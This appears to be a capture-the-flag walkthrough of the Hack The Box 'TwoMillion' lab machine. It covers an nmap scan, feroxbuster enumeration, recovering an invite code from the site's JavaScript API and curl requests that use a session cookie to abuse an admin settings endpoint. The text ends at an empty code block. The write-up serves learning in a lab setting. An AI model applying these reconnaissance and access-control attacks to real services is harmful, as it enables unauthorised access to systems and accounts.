
#### NMAP Scan

**Scanning with version discovery, aggressive scan, no ping and default NSE scans**
```
sudo nmap 10.10.11.221 -sV -A -Pn -sC
```

![[Pasted image 20230901015823.png]]

- Here we see two services available: 22/TCP SSH and 80/TCP HTTP
- On port 80 we see "Did not follow redirect to http://2million.htb/"
- We're going to do two things now.
	1) To ensure we can get to this URL, we're going to make an entry in our /etc/hosts file
	2) Use feroxbuster to enumerate all directories in 2million.htb
``` bash
echo "10.10.11.221 2million.htb" | tee -a /etc/hosts
```

- Directory Brute Forcing
- We're going to enumerate all the directories we can access, hence the 200 HTTP Status Code
```bash
feroxbuster -u http://2million.htb -s 200
```
![[Pasted image 20230903010518.png]]

- Three pages to point out are *register*, *login*, *invite*
- Nothing interesting from the first two pages, unto the invite page
- Inspect the web page and select Debugger. Prettify the htb-frontend.min.js and inviteapi.min.js so you can make the code more readable
- In the inviteapi.min.js file, the return statement contains some interesting data
- There appears to be a few functions being called, verifyInviteCode and makeInviteCode
![[Pasted image 20230903011858.png]]
- How do I know these are functions? Well for one, the naming style. It's similar to camel case. Those two are also the only items that describe an action.
- Ok, now we need to find where else these functions are referenced or better yet, find the file that contains their code blocks.
- Copy and paste one of them in search bar in the left pane
![[Pasted image 20230903012104.png]]
- You will find the the function blocks!!
- Here we see that both are making POST requests to verify and generate the invite code
- What tool can we use to send a POST request and query the server? Curl!!
```
curl -sX POST http://2million.htb/api/v1/invite/verify
```
	-s mutes curl, does not show progress or error messages
	X is the request method
	POST this is the request method we're using, since we're sending data to the server

![[Pasted image 20230903013528.png]]
	NOTE: You can learn more about making curl post requests at [reqbin.com](https://reqbin.com/req/c-g5d14cew/curl-post-example)

First request doesn't yield anything, unto to the second

```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate
```
![[Pasted image 20230903013732.png]]
- What does this message tell us?
	- We have an encrypted message
	- Encryption type is ROT13, given by "encytpe:ROT13"
	- Hint - "Data is encrypted...We should probably check the encryption type in order to decrypt it.."

- Google ROT13, find the website and go to it. ROT13.com
![[Pasted image 20230903014321.png]]

- We get another message "In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"
- Make another POST request to the specified API address
```bash
curl -sX POST http://2million.htb/api/v1/invite/generate
```

![[Pasted image 20230903014504.png]]

- Here we see what appears to be a base64 encoded string, now decode it with base64 -d
```bash
echo "OE5QVTMtMFRCUDEtTDZIN0QtOTBXQTA=" | base64 -d
8NPU3-0TBP1-L6H7D-90WA0  
```

- We get the invite code! Now let's see if it works, go back to the invite page and submit the invite code. You will then be able to register
- I used user for the username and password. 
- Use @hackthebox.htb for the email domain just to be safe
![[Pasted image 20230903014846.png]]

- And we're in!
![[Pasted image 20230903015018.png]]

- Go the the "Access" page
- Fire up burpsuite
- Download the opevpn ovpn file by selecting "Connection Pack" and observe burpsuite
![[Pasted image 20230903080640.png]]

- Burp intercepts the request and shows us an API call to generate the vpn connection for the user
- ![[Pasted image 20230903081202.png]]
- Curl POST request
``` bash
curl -sX POST http://2million.htb/home/access/api/v1/user/vpn/generate
```

![[Pasted image 20230903081828.png]]

- Here we see the page has been moved
- Using the cookie found when intercepting the request with burp, make another curl request up to the /user level
``` bash
curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -sv http://2million.htb/api/v1/user
```

- 301 Moved Permanently
![[Pasted image 20230903084711.png]]

- Go down one level to /v1...same reponse. Go down one more, to /api
- Success!!
![[Pasted image 20230903085517.png]]

- Return one level up
``` bash
curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -sv http://2million.htb/api/v1 | jq
```

![[Pasted image 20230903091017.png]]
- The API call to /api/v1 shows us the instructions for generating an invite code for a regular user, registering a new user and determining if the user is admin
- Make a curl request to /api/v1/admin/settings/update, but note the method change. PUT will be used instead of the POST like we've been using
```bash
curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update | jq
```

- We get a 200 OK message, the page is accessible to us! However, look at the message we received at the end. The "Invalid content type", it's expecting a JSON type
- Run the command again but specify the JSON as the application/json type
![[Pasted image 20230903221646.png]]
- After running take a look at the message again, "Missing parameter: email"
- Input your email with the curl command
``` bash
curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb"}' | jq
```
![[Pasted image 20230903224712.png]]
- It's asking if we're the admin, so run another curl with this item in the request
```

```